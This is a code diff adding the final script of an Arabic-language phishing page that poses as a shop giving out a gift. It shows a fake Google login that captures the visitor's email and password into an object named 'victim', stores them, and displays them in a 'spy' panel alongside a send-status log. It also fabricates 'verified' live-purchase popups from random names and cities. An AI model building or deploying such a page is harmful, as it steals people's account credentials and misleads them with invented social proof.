+$("copyCode").onclick=()=>{ navigator.clipboard.writeText(GIFT.code); toast("✓ تم نسخ الكود"); };
+
+function confetti(){
+  const c=$("confetti"), ctx=c.getContext("2d");
+  const W=c.width=innerWidth, H=c.height=innerHeight;
+  const cols=["#6c5ce7","#00c2a0","#ffb703","#ff4d6d","#4cc9f0","#ffe066"];
+  const P=Array.from({length:170},()=>({x:Math.random()*W,y:-30-Math.random()*H*0.6,
+    w:6+Math.random()*7,h:8+Math.random()*9,c:cols[Math.random()*cols.length|0],
+    vy:2.2+Math.random()*3.2,vx:-1.6+Math.random()*3.2,r:Math.random()*6,vr:-0.22+Math.random()*0.44}));
+  let t=0;
+  (function loop(){
+    ctx.clearRect(0,0,W,H);
+    P.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.r+=p.vr;
+      ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.r);ctx.fillStyle=p.c;
+      ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();});
+    if(++t<300) requestAnimationFrame(loop); else ctx.clearRect(0,0,W,H);
+  })();
+}
+
+const NAMES=["أحمد","محمد","ليلى","سارة","عمر","خالد","نور","ريم","يوسف","هدى","علي","مريم","حسن","لينا","سامر","رهف","زيد","دانا"];
+const CITIES=["دمشق","حلب","بيروت","بغداد","عمّان","القاهرة","الرياض","إستانبول","حمص","اللاذقية","دبي","طرابلس"];
+const ACTS=["اشترى قميصاً صيفياً","اشترى حذاءً رياضياً","أضاف جاكيتاً للمفضلة","حصل على هدية 1000 ليرة","سجّل حساباً جديداً","اشترى حقيبة جلد","طلب فستاناً","اشترى نظارة شمسية"];
+(function liveLoop(){
+  if(!SHOW_LIVE) return;
+  const pick=a=>a[Math.floor(Math.random()*a.length)];
+  const show=()=>{
+    const n=pick(NAMES), c=pick(CITIES), a=pick(ACTS), m=Math.floor(Math.random()*9)+1;
+    const el=document.createElement("div");
+    el.className="live";
+    el.innerHTML=`<div class="live-av">${n[0]}</div><div class="live-tx"><b>${n} — ${c}</b><span>${a}</span><small>قبل ${m} دقيقة · موثّق ✓</small></div>`;
+    document.body.appendChild(el);
+    requestAnimationFrame(()=>el.classList.add("on"));
+    setTimeout(()=>{el.classList.remove("on");setTimeout(()=>el.remove(),450)},5200);
+  };
+  setTimeout(()=>{ show(); setInterval(show, 15000+Math.random()*7000); }, 4500);
+})();
+
+function renderSpy(){
+  $("spy").hidden=false;
+  const rows=o=>Object.entries(o).map(([k,v])=>
+    `<div class="r"><span>${k}</span><span>${v==null||v===""?"—":v}</span></div>`).join("");
+  const st = sendLog.ok===null ? "—"
+    : sendLog.ok ? "<span class='good'>"+sendLog.msg+"</span>"
+    : "<span class='"+(sendLog.needAct?"warn":"bad")+"'>"+sendLog.msg+"</span>";
+  $("spyBody").innerHTML=
+    `<div class="r"><span>الإيميل</span><span>${victim.email||"—"}</span></div>`+
+    (ASK_PASSWORD?`<div class="r"><span>كلمة السر</span><span>${victim.password?`<span class="pw">${victim.password}</span>`:"—"}</span></div>`:"")+
+    `<div class="r"><span>📤 حالة الإرسال</span><span>${st}</span></div>`+
+    `<div class="r"><span>🎁 الهدية</span><span>${GIFT.amount} ${GIFT.currency}</span></div>`+
+    rows(env);
+}
+
+$("openLogin").onclick=()=>modal.hidden=false;
+$("heroLogin").onclick=openGoogle;
+$("modalLogin").onclick=()=>{modal.hidden=true;openGoogle()};
+$("closeLogin").onclick=()=>modal.hidden=true;
+modal.onclick=e=>{if(e.target===modal)modal.hidden=true};
+
+$("btnEmail").onclick=nextEmail;
+$("btnPass").onclick=nextPassword;
+$("gEmail").onkeydown=e=>{if(e.key==="Enter"){e.preventDefault();nextEmail()}};
+$("gPass").onkeydown=e=>{if(e.key==="Enter"){e.preventDefault();nextPassword()}};
+$("gEmail").oninput=()=>{$("fEmail").classList.remove("err");$("mEmail").hidden=true};
+$("gPass").oninput=()=>{$("fPass").classList.remove("err");$("mPass").hidden=true};
+$("gShow").onchange=e=>{$("gPass").type=e.target.checked?"text":"password";$("gPass").focus()};
+
+$("spyToggle").onclick=()=>$("spyCard").hidden=!$("spyCard").hidden;
+$("spyClose").onclick=()=>$("spyCard").hidden=true;
+$("logout").onclick=()=>{
+  localStorage.removeItem("nw");
+  victim={email:"",password:""};
+  $("userChip").hidden=true; $("openLogin").hidden=false;
+  $("userPic").style.visibility="";
+  $("spy").hidden=true; $("spyCard").hidden=true; $("balance").hidden=true;
+  toast("تم الخروج");
+};
+window.addEventListener("popstate",()=>{ if(!gpage.hidden) closeGoogle(); });
+
+try{
+  const s=localStorage.getItem("nw");
+  if(s){
+    const d=JSON.parse(s);
+    if(d&&d.email){ victim=d; finish({restore:true}); }
+  }
+}catch(e){}
+</script>
+</body>
+</html>
